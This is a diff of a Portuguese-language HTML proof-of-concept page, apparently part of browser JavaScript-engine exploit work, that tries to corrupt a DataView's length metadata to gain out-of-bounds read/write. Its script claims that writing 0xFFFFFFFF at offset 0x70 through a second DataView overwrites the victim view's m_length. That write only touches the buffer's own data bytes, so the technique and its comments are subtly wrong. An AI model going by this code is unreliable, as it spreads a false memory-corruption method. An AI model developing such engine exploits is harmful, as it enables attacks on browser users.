@@ -1,31 +1,108 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Teste Isolado - JSON Type Confusion</title>
+    <title>PoC - Leitura/Escrita Fora dos Limites do DataView</title>
     <style>
-        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
-        #output-advanced { /* ID usado por logS3 */
-            background: #222;
-            border: 1px solid #444;
-            padding: 10px;
-            height: 75vh; 
-            overflow-y: auto;
-            white-space: pre-wrap;
-            margin-top: 10px;
-        }
-        /* Estilos básicos de log para melhor visualização */
-        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
-        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; }
-        .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; }
+        body { font-family: monospace; background-color: #1e1e1e; color: #d4d4d4; padding: 1em; }
+        #logOutput { border: 1px solid #555; padding: 10px; min-height: 400px; white-space: pre-wrap; line-height: 1.5; }
+        button { font-size: 1.2em; padding: 10px; margin-bottom: 1em; cursor: pointer; }
+        .good { color: #32cd32; }
+        .bad { color: #ff4500; }
+        .info { color: #87ceeb; }
     </style>
 </head>
 <body>
-    <h1>Teste Isolado: JSON Type Confusion</h1>
-    <p>Abra o console do desenvolvedor para verificar possíveis erros que não são capturados no log da página.</p>
-    <button id="runIsolatedTestBtn">Iniciar Teste Isolado</button>
-    <div id="output-advanced"></div>
+    <h1>Prova de Conceito: Leitura/Escrita OOB em ArrayBuffer</h1>
+    <p>Este teste demonstra a capacidade de ler e escrever além dos limites originais de um <code>DataView</code> após corromper seu metadado de comprimento.</p>
+    <button id="runBtn">Iniciar Teste</button>
+    <h2>Logs:</h2>
+    <pre id="logOutput"></pre>
 
-    <script type="module" src="js/run_isolated_test.mjs"></script>
+    <script>
+        const logOutput = document.getElementById('logOutput');
+
+        function log(message, type = '') {
+            console.log(message);
+            const span = document.createElement('span');
+            if (type) {
+                span.className = type;
+            }
+            span.textContent = `[+] ${message}\n`;
+            logOutput.appendChild(span);
+        }
+
+        async function runOOBTest() {
+            logOutput.innerHTML = '';
+            log("Iniciando o teste de leitura/escrita Out-of-Bounds (OOB)...", "info");
+
+            const ALLOCATION_SIZE = 32768; //
+            const VICTIM_VIEW_ORIGINAL_SIZE = 16; // Limite original do nosso alvo
+            const OOB_WRITE_OFFSET = 32; // Offset que está fora do limite original
+            const TEST_VALUE = 0xDE; // 222 em decimal
+
+            // Offset do campo m_length dentro do buffer que contém os metadados do DataView.
+            // Derivado de: OOB_DV_METADATA_BASE_IN_OOB_BUFFER (0x58) + ArrayBufferView.M_LENGTH_OFFSET (0x18)
+            const DV_LENGTH_METADATA_OFFSET = 0x70; //
+
+            // 1. Alocamos um ArrayBuffer grande.
+            const oob_array_buffer = new ArrayBuffer(ALLOCATION_SIZE);
+            log(`1. ArrayBuffer grande de ${ALLOCATION_SIZE} bytes alocado.`);
+
+            // 2. Criamos nosso DataView "vítima" com um tamanho original MUITO PEQUENO.
+            const victim_dv = new DataView(oob_array_buffer, 0, VICTIM_VIEW_ORIGINAL_SIZE);
+            log(`2. DataView 'vítima' criado com tamanho original de ${VICTIM_VIEW_ORIGINAL_SIZE} bytes.`);
+
+            // 3. Tentamos escrever fora dos limites. Isso DEVE falhar.
+            log(`3. Tentando escrever no offset ${OOB_WRITE_OFFSET} (além do limite de ${VICTIM_VIEW_ORIGINAL_SIZE} bytes)...`);
+            try {
+                victim_dv.setUint8(OOB_WRITE_OFFSET, TEST_VALUE);
+                log("   FALHA NO TESTE: A escrita OOB funcionou ANTES da corrupção. O ambiente pode ser vulnerável de outra forma.", "bad");
+            } catch (e) {
+                if (e instanceof RangeError) {
+                    log("   SUCESSO: Como esperado, a operação foi bloqueada com um RangeError.", "good");
+                } else {
+                    log(`   ERRO INESPERADO: ${e.message}`, "bad");
+                }
+            }
+
+            // 4. Corrompemos o campo de comprimento (m_length) do DataView 'vítima'.
+            log("4. Corrompendo o metadado de comprimento do DataView 'vítima'...", "info");
+            const corruptor_dv = new DataView(oob_array_buffer); // Este DataView enxerga o buffer inteiro
+            corruptor_dv.setUint32(DV_LENGTH_METADATA_OFFSET, 0xFFFFFFFF, true); // Escreve 0xFFFFFFFF no campo de comprimento
+            log(`   Metadado de comprimento (no offset ${DV_LENGTH_METADATA_OFFSET}) foi sobrescrito para 0xFFFFFFFF.`);
+
+            // 5. Tentamos escrever fora dos limites NOVAMENTE. Agora, DEVE funcionar.
+            log(`5. Tentando escrever no offset ${OOB_WRITE_OFFSET} novamente, após a corrupção...`);
+            let writeSuccess = false;
+            try {
+                victim_dv.setUint8(OOB_WRITE_OFFSET, TEST_VALUE);
+                log(`   SUCESSO: Valor ${TEST_VALUE} escrito no offset ${OOB_WRITE_OFFSET} sem erros!`, "good");
+                writeSuccess = true;
+            } catch (e) {
+                log(`   FALHA: A escrita OOB falhou mesmo após a corrupção: ${e.message}`, "bad");
+            }
+            
+            // 6. Verificação: Lemos o valor de volta para confirmar.
+            if (writeSuccess) {
+                log(`6. Verificando... Lendo o valor de volta do offset ${OOB_WRITE_OFFSET}.`);
+                try {
+                    const readValue = victim_dv.getUint8(OOB_WRITE_OFFSET);
+                    if (readValue === TEST_VALUE) {
+                        log(`   !!!! VULNERABILIDADE CONFIRMADA !!!!`, "good");
+                        log(`   Lido: ${readValue}, Esperado: ${TEST_VALUE}. A leitura/escrita fora dos limites originais foi bem-sucedida.`, "good");
+                    } else {
+                         log(`   FALHA NA VERIFICAÇÃO: Lido ${readValue}, mas era esperado ${TEST_VALUE}.`, "bad");
+                    }
+                } catch (e) {
+                    log(`   FALHA NA VERIFICAÇÃO: A leitura OOB falhou: ${e.message}`, "bad");
+                }
+            }
+
+            log("\nTeste concluído.", "info");
+        }
+
+        document.getElementById('runBtn').addEventListener('click', runOOBTest);
+    </script>
 </body>
 </html>
